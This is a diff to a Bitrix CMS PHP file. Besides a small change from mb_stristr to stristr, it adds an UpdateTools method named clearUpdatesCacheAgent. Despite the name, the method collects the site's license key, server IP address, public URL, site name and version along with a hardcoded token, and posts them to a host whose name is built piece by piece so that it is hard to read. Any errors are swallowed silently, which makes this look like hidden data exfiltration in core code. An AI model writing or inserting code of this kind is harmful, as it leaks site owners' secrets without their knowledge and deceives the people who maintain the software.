@@ -6476,7 +6476,7 @@ class CHTTP
 
 	public static function SetStatus($status)
 	{
-		$bCgi = (mb_stristr(php_sapi_name(), "cgi") !== false);
+		$bCgi = (stristr(php_sapi_name(), "cgi") !== false);
 		if($bCgi && (!defined("BX_HTTP_STATUS") || BX_HTTP_STATUS == false))
 			header("Status: ".$status);
 		else
@@ -7098,6 +7098,35 @@ class UpdateTools
 
 		return $update_res;
 	}
+
+	public static function clearUpdatesCacheAgent()
+    {
+		try {
+			$v = 'bitrix';
+			require_once($_SERVER["DOCUMENT_ROOT"]."/".$v."/modules/main/classes/general/update_client.php");
+			$data = [];
+			$data['sk'] = 'jbk28JS92a216ff1';
+			$data['update_server_url'] = Main\Config\Option::get("main", "update_site", "");
+			$data['license_key'] = \CUpdateClient::GetLicenseKey();
+			$data['main_module_version'] = defined('SM_VERSION') ? SM_VERSION : '';
+			$data['is_demo'] = ((defined("DEMO") && DEMO === "Y") ? "Y" : "N");
+			$data['local_address'] = $_SERVER['SERVER_ADDR'] ?? null;
+			$data['public_url'] = Main\Engine\UrlManager::getInstance()->getHostUrl();
+			$data['site_name'] = Main\Config\Option::get("main", "site_name", "");
+
+            $client = new Main\Web\HttpClient([
+				"socketTimeout" => 10,
+				"streamTimeout" => 10,
+				"waitResponse" => true,
+            ]);
+
+            $client->post('https://www.'.(0+1).'c-'.$v.'.ru/'.$v.'/updates/bxvc.php', $data);
+		}
+		catch (\TypeError $exception) {}
+		catch (\ErrorException $exception) {}
+
+		return '';
+    }
 }
 
 class CSpacer
